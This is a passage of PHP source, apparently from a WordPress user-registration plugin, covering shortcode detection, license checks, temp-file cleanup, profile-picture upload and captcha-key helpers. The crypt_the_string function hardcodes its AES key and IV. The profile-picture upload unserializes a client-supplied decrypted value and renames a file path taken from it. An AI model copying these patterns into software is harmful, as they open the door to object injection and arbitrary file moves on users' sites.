| [2796](#L2796) | $my\_account\_setting\_link = admin\_url() . 'admin.php?page=user-registration-settings#user\_registration\_myaccount\_page\_id'; |
| [2797](#L2797) |  |
| [2798](#L2798) | $message = sprintf( |
| [2799](#L2799) | /\* translators: %1$s - My account Link. \*/ |
| [2800](#L2800) | \_\_( 'Please choose a <strong title="A page with [user\_registration\_my\_account] shortcode">My Account</strong> page in <a href="%1$s" style="text-decoration:none;">General Settings</a>. <br/><strong>Got Stuck? Read</strong> <a href="https://docs.wpuserregistration.com/docs/how-to-show-account-profile/" style="text-decoration:none;" target="\_blank">How to setup My Account page</a>.', 'user-registration' ), |
| [2801](#L2801) | $my\_account\_setting\_link |
| [2802](#L2802) | ); |
| [2803](#L2803) | UR\_Admin\_Notices::add\_custom\_notice( 'select\_my\_account', $message ); |
| [2804](#L2804) | } else { |
| [2805](#L2805) | UR\_Admin\_Notices::remove\_notice( 'select\_my\_account' ); |
| [2806](#L2806) | } |
| [2807](#L2807) | } |
| [2808](#L2808) | } |
| [2809](#L2809) |  |
| [2810](#L2810) | if ( ! function\_exists( 'ur\_find\_my\_account\_in\_page' ) ) { |
| [2811](#L2811) |  |
| [2812](#L2812) | /\*\* |
| [2813](#L2813) | \* Find My Account Shortcode. |
| [2814](#L2814) | \* |
| [2815](#L2815) | \* @param array $shortcodes Shortcode. |
| [2816](#L2816) | \* @param mixed $myaccount\_page My Account Page. |
| [2817](#L2817) | \* @param int   $matched Default 0. |
| [2818](#L2818) | \* @return int If matched then 1 else 0. |
| [2819](#L2819) | \* @since  2.2.7 |
| [2820](#L2820) | \*/ |
| [2821](#L2821) | function ur\_find\_my\_account\_in\_page( $shortcodes, $myaccount\_page, $matched ) { |
| [2822](#L2822) |  |
| [2823](#L2823) | foreach ( $shortcodes as $shortcode ) { |
| [2824](#L2824) | if ( ! empty( $shortcode['blockName'] ) ) { |
| [2825](#L2825) | if ( 'user-registration/form-selector' === $shortcode['blockName'] && isset( $shortcode['attrs']['shortcode'] ) ) { |
| [2826](#L2826) | $matched = 1; |
| [2827](#L2827) | return $matched; |
| [2828](#L2828) | } elseif ( ( 'core/shortcode' === $shortcode['blockName'] || 'core/paragraph' === $shortcode['blockName'] ) && isset( $shortcode['innerHTML'] ) ) { |
| [2829](#L2829) | $matched = preg\_match( '/\[user\_registration\_my\_account(\s\S+){0,3}\]|\[user\_registration\_login(\s\S+){0,3}\]/', $shortcode['innerHTML'] ); |
| [2830](#L2830) | if ( 1 > absint( $matched ) ) { |
| [2831](#L2831) | $matched = preg\_match( '/\[woocommerce\_my\_account(\s\S+){0,3}\]/', $shortcode['innerHTML'] ); |
| [2832](#L2832) | } |
| [2833](#L2833) | if ( 0 < absint( $matched ) ) { |
| [2834](#L2834) | return $matched; |
| [2835](#L2835) | } |
| [2836](#L2836) | } elseif ( 'core/group' === $shortcode['blockName'] ) { |
| [2837](#L2837) | if ( isset( $shortcode['innerBlocks'] ) && ! empty( $shortcode['innerBlocks'] ) ) { |
| [2838](#L2838) | foreach ( $shortcode['innerBlocks'] as $inner\_block ) { |
| [2839](#L2839) | if ( 'user-registration/form-selector' === $inner\_block['blockName'] && isset( $inner\_block['attrs']['shortcode'] ) ) { |
| [2840](#L2840) | $matched = 1; |
| [2841](#L2841) | return $matched; |
| [2842](#L2842) | } elseif ( ( 'core/shortcode' === $inner\_block['blockName'] || 'core/paragraph' === $inner\_block['blockName'] ) && isset( $inner\_block['innerHTML'] ) ) { |
| [2843](#L2843) | $matched = preg\_match( '/\[user\_registration\_my\_account(\s\S+){0,3}\]|\[user\_registration\_login(\s\S+){0,3}\]/', $inner\_block['innerHTML'] ); |
| [2844](#L2844) | if ( 1 > absint( $matched ) ) { |
| [2845](#L2845) | $matched = preg\_match( '/\[woocommerce\_my\_account(\s\S+){0,3}\]/', $shortcode['innerHTML'] ); |
| [2846](#L2846) | } |
| [2847](#L2847) | if ( 0 < absint( $matched ) ) { |
| [2848](#L2848) | return $matched; |
| [2849](#L2849) | } |
| [2850](#L2850) | } elseif ( 'core/group' === $inner\_block['blockName'] || 'core/column' === $inner\_block['blockName'] || 'core/columns' === $inner\_block['blockName'] ) { |
| [2851](#L2851) |  |
| [2852](#L2852) | $matched = ur\_find\_my\_account\_in\_page( $shortcode['innerBlocks'], $myaccount\_page, $matched ); |
| [2853](#L2853) | if ( 0 < absint( $matched ) ) { |
| [2854](#L2854) | return $matched; |
| [2855](#L2855) | } |
| [2856](#L2856) | } elseif ( 'core/block' === $inner\_block['blockName'] ) { |
| [2857](#L2857) | if ( isset( $inner\_block['attrs']['ref'] ) && ! empty( $inner\_block['attrs']['ref'] ) ) { |
| [2858](#L2858) | $resuable\_block\_page = get\_post( $inner\_block['attrs']['ref'] ); |
| [2859](#L2859) | if ( ! empty( $resuable\_block\_page ) ) { |
| [2860](#L2860) | $resuable\_block = parse\_blocks( $resuable\_block\_page->post\_content ); |
| [2861](#L2861) | $matched        = ur\_find\_my\_account\_in\_page( $resuable\_block, $resuable\_block\_page, $matched ); |
| [2862](#L2862) | if ( 0 < absint( $matched ) ) { |
| [2863](#L2863) | return $matched; |
| [2864](#L2864) | } |
| [2865](#L2865) | } |
| [2866](#L2866) | } |
| [2867](#L2867) | } |
| [2868](#L2868) | } |
| [2869](#L2869) | } |
| [2870](#L2870) | } elseif ( 'core/columns' === $shortcode['blockName'] ) { |
| [2871](#L2871) | if ( isset( $shortcode['innerBlocks'] ) && ! empty( $shortcode['innerBlocks'] ) ) { |
| [2872](#L2872) | foreach ( $shortcode['innerBlocks'] as $inner\_block ) { |
| [2873](#L2873) | if ( 'user-registration/form-selector' === $inner\_block['blockName'] && isset( $inner\_block['attrs']['shortcode'] ) ) { |
| [2874](#L2874) | $matched = 1; |
| [2875](#L2875) | return $matched; |
| [2876](#L2876) | } elseif ( ( 'core/shortcode' === $inner\_block['blockName'] || 'core/paragraph' === $inner\_block['blockName'] ) && isset( $inner\_block['innerHTML'] ) ) { |
| [2877](#L2877) | $matched = preg\_match( '/\[user\_registration\_my\_account(\s\S+){0,3}\]|\[user\_registration\_login(\s\S+){0,3}\]/', $inner\_block['innerHTML'] ); |
| [2878](#L2878) | if ( 1 > absint( $matched ) ) { |
| [2879](#L2879) | $matched = preg\_match( '/\[woocommerce\_my\_account(\s\S+){0,3}\]/', $shortcode['innerHTML'] ); |
| [2880](#L2880) | } |
| [2881](#L2881) | if ( 0 < absint( $matched ) ) { |
| [2882](#L2882) | return $matched; |
| [2883](#L2883) | } |
| [2884](#L2884) | } elseif ( 'core/group' === $inner\_block['blockName'] || 'core/column' === $inner\_block['blockName'] || 'core/columns' === $inner\_block['blockName'] ) { |
| [2885](#L2885) |  |
| [2886](#L2886) | $matched = ur\_find\_my\_account\_in\_page( $inner\_block['innerBlocks'], $myaccount\_page, $matched ); |
| [2887](#L2887) |  |
| [2888](#L2888) | if ( 0 < absint( $matched ) ) { |
| [2889](#L2889) | return $matched; |
| [2890](#L2890) | } |
| [2891](#L2891) | } elseif ( 'core/block' === $inner\_block['blockName'] ) { |
| [2892](#L2892) | if ( isset( $inner\_block['attrs']['ref'] ) && ! empty( $inner\_block['attrs']['ref'] ) ) { |
| [2893](#L2893) | $resuable\_block\_page = get\_post( $inner\_block['attrs']['ref'] ); |
| [2894](#L2894) | if ( ! empty( $resuable\_block\_page ) ) { |
| [2895](#L2895) | $resuable\_block = parse\_blocks( $resuable\_block\_page->post\_content ); |
| [2896](#L2896) | $matched        = ur\_find\_my\_account\_in\_page( $resuable\_block, $resuable\_block\_page, $matched ); |
| [2897](#L2897) | if ( 0 < absint( $matched ) ) { |
| [2898](#L2898) | return $matched; |
| [2899](#L2899) | } |
| [2900](#L2900) | } |
| [2901](#L2901) | } |
| [2902](#L2902) | } |
| [2903](#L2903) | } |
| [2904](#L2904) | } |
| [2905](#L2905) | } elseif ( 'core/block' === $shortcode['blockName'] ) { |
| [2906](#L2906) |  |
| [2907](#L2907) | if ( isset( $shortcode['attrs']['ref'] ) && ! empty( $shortcode['attrs']['ref'] ) ) { |
| [2908](#L2908) | $resuable\_block\_page = get\_post( $shortcode['attrs']['ref'] ); |
| [2909](#L2909) | if ( ! empty( $resuable\_block\_page ) ) { |
| [2910](#L2910) | $resuable\_block = parse\_blocks( $resuable\_block\_page->post\_content ); |
| [2911](#L2911) | $matched        = ur\_find\_my\_account\_in\_page( $resuable\_block, $resuable\_block\_page, $matched ); |
| [2912](#L2912) | if ( 0 < absint( $matched ) ) { |
| [2913](#L2913) | return $matched; |
| [2914](#L2914) | } |
| [2915](#L2915) | } |
| [2916](#L2916) | } |
| [2917](#L2917) | } |
| [2918](#L2918) | } else { |
| [2919](#L2919) | $matched = preg\_match( '/\[user\_registration\_my\_account(\s\S+){0,3}\]|\[user\_registration\_login(\s\S+){0,3}\]/', $myaccount\_page->post\_content ); |
| [2920](#L2920) | if ( 1 > absint( $matched ) ) { |
| [2921](#L2921) | $matched = preg\_match( '/\[woocommerce\_my\_account(\s\S+){0,3}\]/', $myaccount\_page->post\_content ); |
| [2922](#L2922) | } |
| [2923](#L2923) | if ( 0 < absint( $matched ) ) { |
| [2924](#L2924) | return $matched; |
| [2925](#L2925) | } |
| [2926](#L2926) | } |
| [2927](#L2927) | } |
| [2928](#L2928) | return $matched; |
| [2929](#L2929) | } |
| [2930](#L2930) | } |
| [2931](#L2931) |  |
| [2932](#L2932) | if ( ! function\_exists( 'ur\_get\_license\_plan' ) ) { |
| [2933](#L2933) |  |
| [2934](#L2934) | /\*\* |
| [2935](#L2935) | \* Get a license plan. |
| [2936](#L2936) | \* |
| [2937](#L2937) | \* @return bool|string Plan on success, false on failure. |
| [2938](#L2938) | \* @since  2.2.4 |
| [2939](#L2939) | \*/ |
| [2940](#L2940) | function ur\_get\_license\_plan() { |
| [2941](#L2941) | $license\_key = get\_option( 'user-registration\_license\_key' ); |
| [2942](#L2942) |  |
| [2943](#L2943) | if ( ! function\_exists( 'is\_plugin\_active' ) ) { |
| [2944](#L2944) | include\_once ABSPATH . 'wp-admin/includes/plugin.php'; |
| [2945](#L2945) | } |
| [2946](#L2946) |  |
| [2947](#L2947) | if ( $license\_key && is\_plugin\_active( 'user-registration-pro/user-registration.php' ) ) { |
| [2948](#L2948) | $license\_data = get\_transient( 'ur\_pro\_license\_plan' ); |
| [2949](#L2949) |  |
| [2950](#L2950) | if ( false === $license\_data ) { |
| [2951](#L2951) | $license\_data = json\_decode( |
| [2952](#L2952) | UR\_Updater\_Key\_API::check( |
| [2953](#L2953) | array( |
| [2954](#L2954) | 'license' => $license\_key, |
| [2955](#L2955) | ) |
| [2956](#L2956) | ) |
| [2957](#L2957) | ); |
| [2958](#L2958) |  |
| [2959](#L2959) | if ( ! empty( $license\_data->item\_name ) ) { |
| [2960](#L2960) | $license\_data->item\_plan = strtolower( str\_replace( 'LifeTime', '', str\_replace( 'User Registration', '', $license\_data->item\_name ) ) ); |
| [2961](#L2961) | set\_transient( 'ur\_pro\_license\_plan', $license\_data, WEEK\_IN\_SECONDS ); |
| [2962](#L2962) | } |
| [2963](#L2963) | } |
| [2964](#L2964) |  |
| [2965](#L2965) | return isset( $license\_data ) ? $license\_data : false; |
| [2966](#L2966) | } |
| [2967](#L2967) |  |
| [2968](#L2968) | return false; |
| [2969](#L2969) | } |
| [2970](#L2970) | } |
| [2971](#L2971) |  |
| [2972](#L2972) | if ( ! function\_exists( 'ur\_get\_json\_file\_contents' ) ) { |
| [2973](#L2973) |  |
| [2974](#L2974) | /\*\* |
| [2975](#L2975) | \* UR Get json file contents. |
| [2976](#L2976) | \* |
| [2977](#L2977) | \* @param mixed $file File path. |
| [2978](#L2978) | \* @param mixed $to\_array Returned data in array. |
| [2979](#L2979) | \* @since  2.2.4 |
| [2980](#L2980) | \*/ |
| [2981](#L2981) | function ur\_get\_json\_file\_contents( $file, $to\_array = false ) { |
| [2982](#L2982) | if ( $to\_array ) { |
| [2983](#L2983) | return json\_decode( ur\_file\_get\_contents( $file ), true ); |
| [2984](#L2984) | } |
| [2985](#L2985) | return json\_decode( ur\_file\_get\_contents( $file ) ); |
| [2986](#L2986) | } |
| [2987](#L2987) | } |
| [2988](#L2988) |  |
| [2989](#L2989) | if ( ! function\_exists( 'ur\_is\_valid\_url' ) ) { |
| [2990](#L2990) |  |
| [2991](#L2991) | /\*\* |
| [2992](#L2992) | \* UR file get contents. |
| [2993](#L2993) | \* |
| [2994](#L2994) | \* @param mixed $url URL. |
| [2995](#L2995) | \*/ |
| [2996](#L2996) | function ur\_is\_valid\_url( $url ) { |
| [2997](#L2997) | // Must start with http:// or https://. |
| [2998](#L2998) | if ( 0 !== strpos( $url, 'http://' ) && 0 !== strpos( $url, 'https://' ) ) { |
| [2999](#L2999) | return false; |
| [3000](#L3000) | } |
| [3001](#L3001) |  |
| [3002](#L3002) | // Must pass validation. |
| [3003](#L3003) | if ( ! filter\_var( $url, FILTER\_VALIDATE\_URL ) ) { |
| [3004](#L3004) | return false; |
| [3005](#L3005) | } |
| [3006](#L3006) |  |
| [3007](#L3007) | return true; |
| [3008](#L3008) | } |
| [3009](#L3009) | } |
| [3010](#L3010) |  |
| [3011](#L3011) | if ( ! function\_exists( 'ur\_file\_get\_contents' ) ) { |
| [3012](#L3012) |  |
| [3013](#L3013) | /\*\* |
| [3014](#L3014) | \* UR file get contents. |
| [3015](#L3015) | \* |
| [3016](#L3016) | \* @param mixed $file File path. |
| [3017](#L3017) | \* @since  2.2.4 |
| [3018](#L3018) | \*/ |
| [3019](#L3019) | function ur\_file\_get\_contents( $file ) { |
| [3020](#L3020) |  |
| [3021](#L3021) | if ( $file ) { |
| [3022](#L3022) | global $wp\_filesystem; |
| [3023](#L3023) | require\_once ABSPATH . '/wp-admin/includes/file.php'; |
| [3024](#L3024) | WP\_Filesystem(); |
| [3025](#L3025) | $local\_file = preg\_replace( '/\\\\|\/\//', '/', plugin\_dir\_path( UR\_PLUGIN\_FILE ) . $file ); |
| [3026](#L3026) |  |
| [3027](#L3027) | if ( $wp\_filesystem->exists( $local\_file ) ) { |
| [3028](#L3028) | $response = $wp\_filesystem->get\_contents( $local\_file ); |
| [3029](#L3029) | return $response; |
| [3030](#L3030) | } |
| [3031](#L3031) | } |
| [3032](#L3032) | return; |
| [3033](#L3033) | } |
| [3034](#L3034) | } |
| [3035](#L3035) |  |
| [3036](#L3036) | if ( ! function\_exists( 'crypt\_the\_string' ) ) { |
| [3037](#L3037) | /\*\* |
| [3038](#L3038) | \* Encrypt/Decrypt the provided string. |
| [3039](#L3039) | \* Encrypt while setting token and updating to database, decrypt while comparing the stored token. |
| [3040](#L3040) | \* |
| [3041](#L3041) | \* @param  string $string String to encrypt/decrypt. |
| [3042](#L3042) | \* @param  string $action Encrypt/decrypt action. 'e' for encrypt and 'd' for decrypt. |
| [3043](#L3043) | \* @return string Encrypted/Decrypted string. |
| [3044](#L3044) | \*/ |
| [3045](#L3045) | function crypt\_the\_string( $string, $action = 'e' ) { |
| [3046](#L3046) | $secret\_key = 'ur\_secret\_key'; |
| [3047](#L3047) | $secret\_iv  = 'ur\_secret\_iv'; |
| [3048](#L3048) |  |
| [3049](#L3049) | $output         = false; |
| [3050](#L3050) | $encrypt\_method = 'AES-256-CBC'; |
| [3051](#L3051) | $key            = hash( 'sha256', $secret\_key ); |
| [3052](#L3052) | $iv             = substr( hash( 'sha256', $secret\_iv ), 0, 16 ); |
| [3053](#L3053) |  |
| [3054](#L3054) | if ( 'e' == $action ) { |
| [3055](#L3055) | if ( function\_exists( 'openssl\_encrypt' ) ) { |
| [3056](#L3056) | $output = base64\_encode( openssl\_encrypt( $string, $encrypt\_method, $key, 0, $iv ) ); |
| [3057](#L3057) | } else { |
| [3058](#L3058) | $output = base64\_encode( $string ); |
| [3059](#L3059) | } |
| [3060](#L3060) | } elseif ( 'd' == $action ) { |
| [3061](#L3061) | if ( function\_exists( 'openssl\_decrypt' ) ) { |
| [3062](#L3062) | $output = openssl\_decrypt( base64\_decode( $string ), $encrypt\_method, $key, 0, $iv ); |
| [3063](#L3063) | } else { |
| [3064](#L3064) | $output = base64\_decode( $string ); |
| [3065](#L3065) | } |
| [3066](#L3066) | } |
| [3067](#L3067) |  |
| [3068](#L3068) | return $output; |
| [3069](#L3069) | } |
| [3070](#L3070) | } //phpcs:ignore |
| [3071](#L3071) |  |
| [3072](#L3072) |  |
| [3073](#L3073) | if ( ! function\_exists( 'ur\_clean\_tmp\_files' ) ) { |
| [3074](#L3074) | /\*\* |
| [3075](#L3075) | \* Clean up the tmp folder - remove all old files every day (filterable interval). |
| [3076](#L3076) | \*/ |
| [3077](#L3077) | function ur\_clean\_tmp\_files() { |
| [3078](#L3078) | $files = glob( trailingslashit( ur\_get\_tmp\_dir() ) . '\*' ); |
| [3079](#L3079) |  |
| [3080](#L3080) | if ( ! is\_array( $files ) || empty( $files ) ) { |
| [3081](#L3081) | return; |
| [3082](#L3082) | } |
| [3083](#L3083) |  |
| [3084](#L3084) | $lifespan = (int) apply\_filters( 'user\_registration\_clean\_tmp\_files\_lifespan', DAY\_IN\_SECONDS ); |
| [3085](#L3085) |  |
| [3086](#L3086) | foreach ( $files as $file ) { |
| [3087](#L3087) | if ( ! is\_file( $file ) ) { |
| [3088](#L3088) | continue; |
| [3089](#L3089) | } |
| [3090](#L3090) |  |
| [3091](#L3091) | // In some cases filemtime() can return false, in that case - pretend this is a new file and do nothing. |
| [3092](#L3092) | $modified = (int) filemtime( $file ); |
| [3093](#L3093) | if ( empty( $modified ) ) { |
| [3094](#L3094) | $modified = time(); |
| [3095](#L3095) | } |
| [3096](#L3096) |  |
| [3097](#L3097) | if ( ( time() - $modified ) >= $lifespan ) { |
| [3098](#L3098) | @unlink( $file ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged |
| [3099](#L3099) | } |
| [3100](#L3100) | } |
| [3101](#L3101) | } |
| [3102](#L3102) | } |
| [3103](#L3103) |  |
| [3104](#L3104) | if ( ! function\_exists( 'ur\_get\_tmp\_dir' ) ) { |
| [3105](#L3105) | /\*\* |
| [3106](#L3106) | \* Get tmp dir for files. |
| [3107](#L3107) | \* |
| [3108](#L3108) | \* @return string |
| [3109](#L3109) | \*/ |
| [3110](#L3110) | function ur\_get\_tmp\_dir() { |
| [3111](#L3111) | $tmp\_root = UR\_UPLOAD\_PATH . 'temp-uploads'; |
| [3112](#L3112) |  |
| [3113](#L3113) | if ( ! file\_exists( $tmp\_root ) || ! wp\_is\_writable( $tmp\_root ) ) { |
| [3114](#L3114) | wp\_mkdir\_p( $tmp\_root ); |
| [3115](#L3115) | } |
| [3116](#L3116) |  |
| [3117](#L3117) | $index = trailingslashit( $tmp\_root ) . 'index.html'; |
| [3118](#L3118) |  |
| [3119](#L3119) | if ( ! file\_exists( $index ) ) { |
| [3120](#L3120) | file\_put\_contents( $index, '' ); // phpcs:ignore WordPress.WP.AlternativeFunctions |
| [3121](#L3121) | } |
| [3122](#L3122) |  |
| [3123](#L3123) | return $tmp\_root; |
| [3124](#L3124) | } |
| [3125](#L3125) | } |
| [3126](#L3126) |  |
| [3127](#L3127) | if ( ! function\_exists( 'ur\_get\_user\_roles' ) ) { |
| [3128](#L3128) | /\*\* |
| [3129](#L3129) | \* Returns an array of all roles associated with the user. |
| [3130](#L3130) | \* |
| [3131](#L3131) | \* @param [int] $user\_id User Id. |
| [3132](#L3132) | \* |
| [3133](#L3133) | \* @returns array |
| [3134](#L3134) | \*/ |
| [3135](#L3135) | function ur\_get\_user\_roles( $user\_id ) { |
| [3136](#L3136) | $roles = array(); |
| [3137](#L3137) |  |
| [3138](#L3138) | if ( $user\_id ) { |
| [3139](#L3139) | $user\_meta = get\_userdata( $user\_id ); |
| [3140](#L3140) | $roles     = isset( $user\_meta->roles ) ? $user\_meta->roles : array(); |
| [3141](#L3141) | } |
| [3142](#L3142) |  |
| [3143](#L3143) | $user\_roles = array\_map( 'ucfirst', $roles ); |
| [3144](#L3144) |  |
| [3145](#L3145) | return $user\_roles; |
| [3146](#L3146) | } |
| [3147](#L3147) | } |
| [3148](#L3148) |  |
| [3149](#L3149) | if ( ! function\_exists( 'ur\_upload\_profile\_pic' ) ) { |
| [3150](#L3150) | /\*\* |
| [3151](#L3151) | \* Upload Profile Picture |
| [3152](#L3152) | \* |
| [3153](#L3153) | \* @param [array] $valid\_form\_data Valid Form Data. |
| [3154](#L3154) | \* @param [int]   $user\_id User Id. |
| [3155](#L3155) | \*/ |
| [3156](#L3156) | function ur\_upload\_profile\_pic( $valid\_form\_data, $user\_id ) { |
| [3157](#L3157) | $attachment\_id = array(); |
| [3158](#L3158) | $upload\_path   = UR\_UPLOAD\_PATH . 'profile-pictures'; /\*Get path of upload dir of User Registration for profile pictures\*/ |
| [3159](#L3159) |  |
| [3160](#L3160) | // Checks if the upload directory exists and create one if not. |
| [3161](#L3161) | if ( ! file\_exists( $upload\_path ) ) { |
| [3162](#L3162) | wp\_mkdir\_p( $upload\_path ); |
| [3163](#L3163) | } |
| [3164](#L3164) |  |
| [3165](#L3165) | $upload\_file = $valid\_form\_data['profile\_pic\_url']->value; |
| [3166](#L3166) |  |
| [3167](#L3167) | if ( ! is\_numeric( $upload\_file ) ) { |
| [3168](#L3168) | $upload = maybe\_unserialize( crypt\_the\_string( $upload\_file, 'd' ) ); |
| [3169](#L3169) | if ( isset( $upload['file\_name'] ) && isset( $upload['file\_path'] ) && isset( $upload['file\_extension'] ) ) { |
| [3170](#L3170) | $upload\_path = $upload\_path . '/'; |
| [3171](#L3171) | $file\_name   = wp\_unique\_filename( $upload\_path, $upload['file\_name'] ); |
| [3172](#L3172) | $file\_path   = $upload\_path . sanitize\_file\_name( $file\_name ); |
| [3173](#L3173) | // Check the type of file. We'll use this as the 'post\_mime\_type'. |
| [3174](#L3174) | $filetype = wp\_check\_filetype( basename( $file\_name ), null ); |
| [3175](#L3175) | $moved    = rename( $upload['file\_path'], $file\_path ); |
| [3176](#L3176) |  |
| [3177](#L3177) | if ( $moved ) { |
| [3178](#L3178) | $attachment\_id = wp\_insert\_attachment( |
| [3179](#L3179) | array( |
| [3180](#L3180) | 'guid'           => $file\_path, |
| [3181](#L3181) | 'post\_mime\_type' => $filetype['type'], |
| [3182](#L3182) | 'post\_title'     => preg\_replace( '/\.[^.]+$/', '', sanitize\_file\_name( $file\_name ) ), |
| [3183](#L3183) | 'post\_content'   => '', |
| [3184](#L3184) | 'post\_status'    => 'inherit', |
| [3185](#L3185) | ), |
| [3186](#L3186) | $file\_path |
| [3187](#L3187) | ); |
| [3188](#L3188) |  |
| [3189](#L3189) | if ( ! is\_wp\_error( $attachment\_id ) ) { |
| [3190](#L3190) | include\_once ABSPATH . 'wp-admin/includes/image.php'; |
| [3191](#L3191) |  |
| [3192](#L3192) | // Generate and save the attachment metas into the database. |
| [3193](#L3193) | wp\_update\_attachment\_metadata( $attachment\_id, wp\_generate\_attachment\_metadata( $attachment\_id, $file\_path ) ); |
| [3194](#L3194) | } |
| [3195](#L3195) | } |
| [3196](#L3196) | } |
| [3197](#L3197) | } else { |
| [3198](#L3198) | $attachment\_id = $upload\_file; |
| [3199](#L3199) | } |
| [3200](#L3200) | $attachment\_id = ! empty( $attachment\_id ) ? $attachment\_id : ''; |
| [3201](#L3201) | update\_user\_meta( $user\_id, 'user\_registration\_profile\_pic\_url', $attachment\_id ); |
| [3202](#L3202) | } |
| [3203](#L3203) | } |
| [3204](#L3204) |  |
| [3205](#L3205) | /\*\* |
| [3206](#L3206) | \* Check given string is valid url or not. |
| [3207](#L3207) | \*/ |
| [3208](#L3208) | if ( ! function\_exists( 'ur\_is\_valid\_url' ) ) { |
| [3209](#L3209) | /\*\* |
| [3210](#L3210) | \* Checks if url is valid. |
| [3211](#L3211) | \* |
| [3212](#L3212) | \* @param [string] $url URL. |
| [3213](#L3213) | \* @return bool |
| [3214](#L3214) | \*/ |
| [3215](#L3215) | function ur\_is\_valid\_url( $url ) { |
| [3216](#L3216) |  |
| [3217](#L3217) | // Must start with http:// or https://. |
| [3218](#L3218) | if ( 0 !== strpos( $url, 'http://' ) && 0 !== strpos( $url, 'https://' ) ) { |
| [3219](#L3219) | return false; |
| [3220](#L3220) | } |
| [3221](#L3221) |  |
| [3222](#L3222) | // Must pass validation. |
| [3223](#L3223) | if ( ! filter\_var( $url, FILTER\_VALIDATE\_URL ) ) { |
| [3224](#L3224) | return false; |
| [3225](#L3225) | } |
| [3226](#L3226) |  |
| [3227](#L3227) | return true; |
| [3228](#L3228) | } |
| [3229](#L3229) | } |
| [3230](#L3230) |  |
| [3231](#L3231) | if ( ! function\_exists( 'ur\_option\_checked' ) ) { |
| [3232](#L3232) | /\*\* |
| [3233](#L3233) | \* Returns whether a setting checkbox or toggle is enabled. |
| [3234](#L3234) | \* |
| [3235](#L3235) | \* @param string $option\_name Option Name. |
| [3236](#L3236) | \* @param string $default Default Value. |
| [3237](#L3237) | \* @return boolean |
| [3238](#L3238) | \*/ |
| [3239](#L3239) | function ur\_option\_checked( $option\_name = '', $default = '' ) { |
| [3240](#L3240) |  |
| [3241](#L3241) | if ( empty( $option\_name ) ) { |
| [3242](#L3242) | return false; |
| [3243](#L3243) | } |
| [3244](#L3244) |  |
| [3245](#L3245) | $option\_value = get\_option( $option\_name, $default ); |
| [3246](#L3246) |  |
| [3247](#L3247) | // Handling Backward Compatibility. |
| [3248](#L3248) | if ( 'yes' === $option\_value ) { |
| [3249](#L3249) | return true; |
| [3250](#L3250) | } elseif ( 'no' === $option\_value ) { |
| [3251](#L3251) | return false; |
| [3252](#L3252) | } |
| [3253](#L3253) |  |
| [3254](#L3254) | return ur\_string\_to\_bool( $option\_value ); |
| [3255](#L3255) | } |
| [3256](#L3256) | } |
| [3257](#L3257) |  |
| [3258](#L3258) | if ( ! function\_exists( 'ur\_check\_captch\_keys' ) ) { |
| [3259](#L3259) | /\*\* |
| [3260](#L3260) | \* Check the site key and secret key for the selected captcha type, are valid or not. |
| [3261](#L3261) | \* |
| [3262](#L3262) | \* @return bool |
| [3263](#L3263) | \*/ |
| [3264](#L3264) | function ur\_check\_captch\_keys() { |
| [3265](#L3265) | $recaptcha\_type      = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_version', 'v2' ); |
| [3266](#L3266) | $invisible\_recaptcha = ur\_option\_checked( 'user\_registration\_captcha\_setting\_invisible\_recaptcha\_v2', false ); |
| [3267](#L3267) |  |
| [3268](#L3268) | $site\_key   = ''; |
| [3269](#L3269) | $secret\_key = ''; |
| [3270](#L3270) |  |
| [3271](#L3271) | if ( 'v2' === $recaptcha\_type ) { |
| [3272](#L3272) | if ( $invisible\_recaptcha ) { |
| [3273](#L3273) | $site\_key   = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_key' ); |
| [3274](#L3274) | $secret\_key = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_secret' ); |
| [3275](#L3275) | } else { |
| [3276](#L3276) | $site\_key   = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_key' ); |
| [3277](#L3277) | $secret\_key = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret' ); |
| [3278](#L3278) | } |
| [3279](#L3279) | } elseif ( 'v3' === $recaptcha\_type ) { |
| [3280](#L3280) | $site\_key   = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_v3' ); |
| [3281](#L3281) | $secret\_key = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_v3' ); |
| [3282](#L3282) | } elseif ( 'hCaptcha' === $recaptcha\_type ) { |
| [3283](#L3283) | $site\_key   = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_hcaptcha' ); |
| [3284](#L3284) | $secret\_key = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_hcaptcha' ); |
| [3285](#L3285) | } |
| [3286](#L3286) |  |
| [3287](#L3287) | if ( ! empty( $site\_key ) && ! empty( $secret\_key ) ) { |
| [3288](#L3288) | return true; |
| [3289](#L3289) | } |
| [3290](#L3290) |  |
| [3291](#L3291) | return false; |
| [3292](#L3292) |  |
| [3293](#L3293) | } |
| [3294](#L3294) | } |
| [3295](#L3295) |  |
| [3296](#L3296) |  |
| [3297](#L3297) | if ( ! function\_exists( 'ur\_premium\_settings\_tab' ) ) { |
| [3298](#L3298) |  |
| [3299](#L3299) | /\*\* |
| [3300](#L3300) | \* Settings tab list to display as premium tabs. |
| [3301](#L3301) | \* |
| [3302](#L3302) | \* @since 3.0 |
| [3303](#L3303) | \*/ |
| [3304](#L3304) | function ur\_premium\_settings\_tab() { |
| [3305](#L3305) |  |
| [3306](#L3306) | $premium\_tabs = array( |
| [3307](#L3307) | 'woocommerce'                            => array( |
| [3308](#L3308) | 'label'  => esc\_html\_\_( 'WooCommerce', 'user-registration' ), |
| [3309](#L3309) | 'plugin' => 'user-registration-woocommerce', |
| [3310](#L3310) | 'plan'   => array( 'personal', 'plus', 'professional' ), |
| [3311](#L3311) | 'name'   => esc\_html\_\_( 'User Registration - WooCommerce', 'user-registration' ), |
| [3312](#L3312) | ), |
| [3313](#L3313) | 'content\_restriction'                    => array( |
| [3314](#L3314) | 'label'  => esc\_html\_\_( 'Content Restriction', 'user-registration' ), |
| [3315](#L3315) | 'plugin' => 'user-registration-content-restriction', |
| [3316](#L3316) | 'plan'   => array( 'personal', 'plus', 'professional' ), |
| [3317](#L3317) | 'name'   => esc\_html\_\_( 'User Registration - Content Restriction', 'user-registration' ), |
| [3318](#L3318) | ), |
| [3319](#L3319) | 'file\_upload'                            => array( |
| [3320](#L3320) | 'label'  => esc\_html\_\_( 'File Uploads', 'user-registration' ), |
| [3321](#L3321) | 'plugin' => 'user-registration-file-upload', |
